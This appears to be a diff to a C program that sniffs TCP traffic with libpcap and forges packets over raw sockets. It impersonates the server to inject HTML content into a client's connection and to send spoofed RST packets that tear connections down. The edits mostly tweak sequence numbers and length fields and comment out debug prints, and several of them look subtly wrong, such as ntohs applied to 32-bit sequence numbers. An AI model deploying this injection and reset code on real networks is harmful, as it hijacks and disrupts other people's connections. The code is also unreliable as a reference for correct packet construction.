@@ -10,6 +10,7 @@
 #define __USE_BSD         /* Using BSD IP header           */ 
 #include <netinet/ip.h>   /* Internet Protocol             */ 
 #define __FAVOR_BSD       /* Using BSD TCP header          */ 
+#include <netinet/in.h>
 #include <netinet/tcp.h>  /* Transmission Control Protocol */ 
 #include <pcap.h>         /* Libpcap                       */ 
 #include <string.h>       /* String operations             */ 
@@ -193,34 +194,37 @@ while(1){
 	  if(payload_METHOD_buffer[i]==payload_METHOD[i]){
 	  	cmp1=1;
 	  }else{
-		cmp1=0;
+		  cmp1=0;
 	  }
 	}
   if(cmp1==1){
-    printf("+--------------------------------------+\n");
-      printf("%s",payload);
-      payload="";
+    //printf("+--------------------------------------+\n");
+      //printf("%s",payload);
+      //payload="";
+      //printf("th_seq outer fake_sender:%d\n",tcp->th_seq);
       //pretend be server,and send RST to source client fack server
-      Fake_send(tcp->th_ack, ip->ip_dst.s_addr, ip->ip_src.s_addr, tcp->th_dport, tcp->th_sport);
+Fake_send(tcp->th_seq, ip->ip_dst.s_addr, ip->ip_src.s_addr, tcp->th_dport, tcp->th_sport);
       //preten be client, and sent RST to server....fack client
-      TCP_RST_send(htonl(ntohl(tcp->th_seq)+1), ip->ip_src.s_addr, ip->ip_dst.s_addr, tcp->th_sport, tcp->th_dport);
-    printf("\n+-------------------------+\n");
+      //TCP_RST_send(htonl(ntohl(tcp->th_seq)+1), ip->ip_src.s_addr, ip->ip_dst.s_addr, tcp->th_sport, tcp->th_dport);
+    //printf("\n+-------------------------+\n");
   }
  
- 	iphdr = (struct ip *)(packet+14);
- 	tcphdr = (struct tcphdr *)(packet+14+20);
+ 	//iphdr = (struct ip *)(packet+14);
+ 	//tcphdr = (struct tcphdr *)(packet+14+20);
  	
 	/*dst_port=ntohs(tcphdr->th_dport);
 
 	 	if(count==0)printf("+-------------------------+\n");
  		printf("Received Packet No.%d:\n", ++count);
- 		printf("   ACK: %u\n", ntohl(tcphdr->th_ack) ); 
- 		printf("   SEQ: %u\n", ntohl(tcphdr->th_seq) );
- 		printf("   DST IP: %d\n", iphdr->ip_dst); 
- 		printf("   SRC IP: %d\n", iphdr->ip_src); 
- 		printf("   SRC PORT: %d\n", ntohs(tcphdr->th_sport) ); 
- 		printf("   DST PORT: %d\n", dst_port ); 
-	*/
+ 	*/	
+
+ printf("   ACK: %u\n", ntohs(tcp->th_ack) ); 
+ printf("   SEQ: %u\n", ntohs(tcp->th_seq) );
+    // printf("   SRC PORT: %d\n", ntohs(tcphdr->th_sport) ); 
+      //printf("   DST PORT: %d\n", ntohs(tcphdr->th_dport) ); 
+
+
+
 	//TCP_RST_send(tcp->th_ack, ip->ip_dst.s_addr, ip->ip_src.s_addr, tcp->th_dport, tcp->th_sport);
 	//TCP_RST_send(htonl(ntohl(tcp->th_seq)+1), ip->ip_src.s_addr, ip->ip_dst.s_addr, tcp->th_sport, tcp->th_dport);
 
@@ -309,7 +313,7 @@ int Fake_send(u_int32 seq, u_int32 src_ip, u_int32 dst_ip, u_int16 src_prt, u_in
   ipheader->ip_tos = 0;    /* Type of Service (Usually zero)                 */
   
   //加了包大小计算的地方之一
-  ipheader->ip_len = htons( sizeof (struct ip) + sizeof (struct tcphdr)+payload_len );         
+  ipheader->ip_len = htons( sizeof (struct ip) + sizeof (struct tcphdr)+ payload_len+1 );         
   ipheader->ip_off = 0;    /* Fragment offset. We'll not use this            */
   ipheader->ip_ttl = 64;   /* Time to live: 64 in Linux, 128 in Windows...   */
   ipheader->ip_p = 6;      /* Transport layer prot. TCP=6, UDP=17, ICMP=1... */
@@ -336,7 +340,7 @@ int Fake_send(u_int32 seq, u_int32 src_ip, u_int32 dst_ip, u_int16 src_prt, u_in
   pseudohdr.zero = 0;
   pseudohdr.protocol = ipheader->ip_p;
   //加了包大小的地方之一
-  pseudohdr.tcplen = htons( sizeof(struct tcphdr)+payload_len);
+  pseudohdr.tcplen = htons(sizeof(struct tcphdr));
 
   /* Copy header and pseudoheader to a buffer to compute the checksum */  
   memcpy(tcpcsumblock, &pseudohdr, sizeof(tcp_phdr_t));   
@@ -355,8 +359,10 @@ int Fake_send(u_int32 seq, u_int32 src_ip, u_int32 dst_ip, u_int16 src_prt, u_in
   //
   //
  
-  printf("payload_len:%d\n",payload_len); 
-  printf("size_t length:%d\n",ntohs(ipheader->ip_len));
+  //printf("payload_len:%d\n",payload_len); 
+  //printf("size_t length:%d\n",ntohs(ipheader->ip_len));
+
+  //printf("SEQ INSIDE THE FAKE:%d\n",seq);
   
   //copy the payload_content to packet;
   //
@@ -364,8 +370,8 @@ int Fake_send(u_int32 seq, u_int32 src_ip, u_int32 dst_ip, u_int16 src_prt, u_in
       packet[j]=html_content[j-payload_offset];
   }
 
-  printf("Html contetent %s\n",html_content);
-  printf("packets %s\n",packet);
+  //printf("Html contetent %s\n",html_content);
+  //printf("packets %s\n",packet);
 
 
   /* Send it through the raw socket */    
@@ -378,8 +384,8 @@ int Fake_send(u_int32 seq, u_int32 src_ip, u_int32 dst_ip, u_int16 src_prt, u_in
   printf("Sent RST Packet:\n");
   printf("   SRC: %d \n", ipheader->ip_src);
   printf("   DST: %d \n", ipheader->ip_dst);
-  printf("   Seq=%u\n", ntohl(tcpheader->th_seq));
-  printf("   Ack=%d\n", ntohl(tcpheader->th_ack));
+  printf("   Seq=%u\n", ntohs(tcpheader->th_seq));
+  printf("   Ack=%u\n", ntohs(tcpheader->th_ack));
   printf("   TCPsum: %02x\n",  tcpheader->th_sum);
   printf("   IPsum: %02x\n", ipheader->ip_sum);
     
